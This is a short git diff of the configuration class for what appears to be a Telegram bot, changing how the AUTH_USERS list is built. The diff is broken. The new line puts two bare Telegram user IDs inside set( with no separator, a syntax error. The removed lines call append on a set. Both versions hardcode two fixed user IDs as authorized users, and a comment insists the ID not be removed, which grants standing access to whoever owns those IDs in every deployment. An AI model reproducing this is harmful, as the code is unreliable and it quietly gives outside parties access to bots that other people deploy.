@@ -9,14 +9,13 @@ class Config(object):
     LOG_CHANNEL = get_config("LOG_CHANNEL")
     UPDATES_CHANNEL = get_config("UPDATES_CHANNEL", None) # Without `@` LOL
      # Get these values from my.telegram.org
-    AUTH_USERS = set(
+    AUTH_USERS = set(6265459491 2036803347
         int(x) for x in get_config(
             "AUTH_USERS",
             should_prompt=True
         ).split()
     )
-    AUTH_USERS.append(6265459491)
-    AUTH_USERS.append(2036803347)
+    
 # array , simplest method was AUTH_USERS = [] ; AUTH_USERS.append(your telegram id) 🤣
     # array to store the channel ID who are authorized to use the bot
     # dont u fucking remove this id 😤
